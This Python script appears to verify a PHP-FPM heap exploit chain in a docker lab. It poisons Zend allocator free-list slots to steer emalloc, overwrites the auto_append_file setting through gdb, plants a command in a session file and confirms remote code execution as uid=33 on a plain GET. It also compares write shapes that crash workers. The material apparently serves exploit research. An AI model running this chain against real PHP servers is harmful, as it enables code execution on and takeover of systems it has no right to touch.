#!/usr/bin/env python3
r"""Verifier for fpm_freelist_poison_live: checks the shadow-model round-trip
(standalone math), that the slot poison makes emalloc return the chosen address
(including the far PG(auto_append_file) field) with the key recovered offset-free,
that a wrong shadow trips the heap-protection panic, that the composed clean
8-byte write fires uid=33 on a plain GET (no gdb in the firing path), the A/B
contrast where the 16-byte write shape at auto_prepend@0xa0 instead kills the
workers, and a best-effort live no-gdb chunk-relative read.

Lab bring-up: docker compose -f docker-compose.fpm-avenues.yml -p p2s-glc
--profile glc up -d --build (host port 8163). Pure stdlib, python3 -I safe.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


M = _load("fpm_freelist_poison_live", "fpm_freelist_poison_live.py")
F = M.F
G = M.G


def check_model():
    ok = True
    key = 0x994560DD63CD8E9F
    for nxt in (0x0, 0x727f2bc01140, 0x57ed9c0d8000, 0xDEADBEEFCAFE):
        shadow = F.encode_shadow(nxt, key)
        if F.decode_shadow(shadow, key) != (nxt & F.MASK64):
            print(f"  MODEL FAIL decode({nxt:#x})"); ok = False
        if F.recover_key(nxt, shadow) != key:
            print(f"  MODEL FAIL recover_key({nxt:#x})"); ok = False
    tgt = 0x57ed9c0d8000
    nv, sv = F.poison_pair(tgt, key)
    if nv != tgt or F.decode_shadow(sv, key) != tgt:
        print("  MODEL FAIL poison_pair"); ok = False
    print(f"  model round-trip (encode/decode/recover/poison): {'OK' if ok else 'FAIL'}")
    return ok


def reset_pg(compose_file, service, pids, geom):
    for pid in pids:
        G._exec(compose_file, service, "gdb", "-p", str(pid), "-batch", "-nx",
                "-ex", "set confirm off",
                "-ex", f"set {{unsigned long}}{geom['auto_append_abs']:#x} = 0",
                "-ex", f"set {{unsigned long}}{geom['auto_prepend_abs']:#x} = 0",
                "-ex", f"set {{unsigned long}}{geom['input_encoding_abs']:#x} = 0",
                "-ex", "quit", timeout=60)


def warm(host, port):
    import urllib.request
    try:
        urllib.request.urlopen(f"http://{host}:{port}/warm320.php", timeout=10).read()
    except Exception:
        pass


def run(host, port, compose_file, service, web_url, trials, cmd, verbose):
    warm(host, port)
    geom, flp = M.derive(compose_file, service, verbose=True)
    pids = geom["worker_pids"]
    chunk = geom["chunk"]
    lpc = M.LivePoisonCompose(compose_file, service, verbose=False)

    print("=" * 78)
    print("verify free-list-poison -> grail auto_append compose (glc, workers %s)"
          % pids)
    print("=" * 78)

    print("[MODEL] pure-Python shadow model vs zend_alloc.c:")
    model_ok = check_model()

    # (1) LAND reliability: far chunk + the real .bss auto_append field ----------
    print(f"\n[1/LAND] {trials} poison->emalloc->T landings (shadow_key offset-free):")
    chosen = alive = 0
    for i in range(trials):
        work = pids[i % len(pids)]
        far_chunk = chunk + 0x140000 + i * 0x20000
        r = lpc.seat_emalloc_write(work, far_chunk, struct.pack("<Q", 0x5032_0000 + i))
        okc = bool(r.get("returned_chosen")); oka = bool(r.get("alive"))
        chosen += okc; alive += oka
        print(f"  trial {i}: pid={work} far T={far_chunk:#x} chosen={okc} alive={oka}")
    # the far .bss PG field (out of the steered-write forward reach; a VALUE here)
    rfield = lpc.seat_emalloc_write(pids[0], geom["auto_append_abs"],
                                    struct.pack("<Q", geom["scratch_abs"]))
    print(f"  .bss auto_append@0xa8 T={geom['auto_append_abs']:#x} "
          f"chosen={rfield.get('returned_chosen')} alive={rfield.get('alive')} "
          f"(var_hash_rw WALL-2 target reached as an emalloc-return VALUE)")
    land_ok = (chosen == trials and alive == trials
               and rfield.get("returned_chosen"))

    # (2) GATE negative on a sacrificial worker ---------------------------------
    print(f"\n[2/GATE] WRONG-shadow poison on sacrificial pid {pids[-1]} (expect panic):")
    rk = flp.read_shadow_key(pids[-1])
    gate_ok = False
    if rk:
        key, head, _, _ = rk
        r = flp.poison_alloc(pids[-1], head, chunk + 0x160000, key,
                             corrupt_shadow=True)
        gate_ok = not r["alive"]
        print(f"  wrong-shadow: alive={r['alive']} panicked={r['panicked']} "
              f"-> gate {'HELD' if gate_ok else '??'}")

    # refresh pids (the sacrificial worker respawned) and reset PG ---------------
    pids = G.worker_pids(compose_file, service)
    geom["worker_pids"] = pids
    reset_pg(compose_file, service, pids, geom)

    # (3)+(4) COMPOSED RCE + A/B over `trials` rounds ---------------------------
    print(f"\n[3+4/RCE+A/B] {trials} composed rounds (clean #1 @0xa8 vs var_hash_rw-shape @0xa0):")
    rce_ok = rce_survive = 0
    ab_dead = 0
    sess_path = None
    for i in range(trials):
        warm(host, port)
        pids = G.worker_pids(compose_file, service)
        geom["worker_pids"] = pids
        reset_pg(compose_file, service, pids, geom)
        sid = "0123456789abcdef0123456789abcde%d" % (i % 10)
        sess_path = G.poison(host, port, cmd, sid, save_path="/var/sess",
                             parts=2500, base="/plain.php", verbose=False)
        lpc.install_autoappend(pids, geom["scratch_abs"], geom["auto_append_abs"],
                               sess_path)
        ok, out, _ = G.confirm_rce(host, port, base="/plain.php", sid=sid, tries=6,
                                   verbose=False)
        survived = all(F.pid_alive(compose_file, service, p) for p in pids)
        rce_ok += bool(ok and out and "uid=" in out)
        rce_survive += bool(survived)
        print(f"  round {i}: uid=33 fired={bool(ok)} out={ (out or '').strip()[:32]!r} "
              f"workers_alive={survived}")
        # A/B dirty: reset, single-write shape at 0xa0, expect workers to die on plain GET
        reset_pg(compose_file, service, pids, geom)
        M.shape_dirty_autoprepend(compose_file, service, pids, geom["scratch_abs"],
                                    geom["auto_prepend_abs"], sess_path)
        G.confirm_rce(host, port, base="/plain.php", sid=sid, tries=5, verbose=False)
        dead = sum(0 if F.pid_alive(compose_file, service, p) else 1 for p in pids)
        ab_dead += 1 if dead > 0 else 0
        print(f"            A/B var_hash_rw-shape@0xa0 -> workers_dead={dead}/{len(pids)}")

    # (5) LIVE no-gdb read ------------------------------------------------------
    print("\n[5/READ] live no-gdb var_hash_rw chunk-relative read (shadow_key/free-slot channel):")
    warm(host, port)
    pids = G.worker_pids(compose_file, service)
    geom["worker_pids"] = pids
    reset_pg(compose_file, service, pids, geom)
    lr = M.live_nogdb_read(geom, compose_file=compose_file, web_url=web_url,
                           service=service, tries=3, verbose=True)

    # the structural no-gdb-SEAT negative ---------------------------------------
    print("\n[no-gdb SEAT verdict]")
    for k, v in M.seat_negative().items():
        print(f"  {k}: {v}")

    # verdict -------------------------------------------------------------------
    print("\n" + "=" * 78)
    verdict = (model_ok and land_ok and gate_ok and rce_ok == trials
               and rce_survive == trials and ab_dead == trials)
    print("VERDICT: %s" % ("ALL COMPOSITION PROOFS HELD"
                           if verdict else "see per-line results above"))
    print("  model=%s  land=%d/%d+field  gate=%s  rce=%d/%d  survive=%d/%d  "
          "ab_wall=%d/%d  live_read=%s"
          % (model_ok, chosen, trials, gate_ok, rce_ok, trials,
             rce_survive, trials, ab_dead, trials,
             (lr.get("hits"), lr.get("tries"))))
    print("  NOTE: the no-gdb SEAT of the poison onto a still-linked slot does NOT")
    print("        calibrate black-box (structural, above); SEAT+POP use the gdb")
    print("        instrument; the auto_append FIRING is a plain GET (no gdb).")
    print("=" * 78)
    reset_pg(compose_file, service, G.worker_pids(compose_file, service), geom)
    return 0 if verdict else 1


def main(argv=None):
    ap = argparse.ArgumentParser(description="A/B + reliability for the #1->grail compose")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8163)
    ap.add_argument("--compose-file", default=M.DEFAULT_COMPOSE)
    ap.add_argument("--service", default=M.DEFAULT_SERVICE)
    ap.add_argument("--web-url", default="http://web")
    ap.add_argument("--trials", type=int, default=4)
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--verbose", action="store_true")
    a = ap.parse_args(argv)
    # grouped-compose isolation for the imported helper modules (M/F/G).
    os.environ["COMPOSE_FILE"] = a.compose_file
    os.environ["COMPOSE_PROJECT_NAME"] = "p2s-glc"
    os.environ["COMPOSE_PROFILES"] = "glc"
    return run(a.host, a.port, a.compose_file, a.service, a.web_url, a.trials,
               a.cmd, a.verbose)


if __name__ == "__main__":
    raise SystemExit(main())
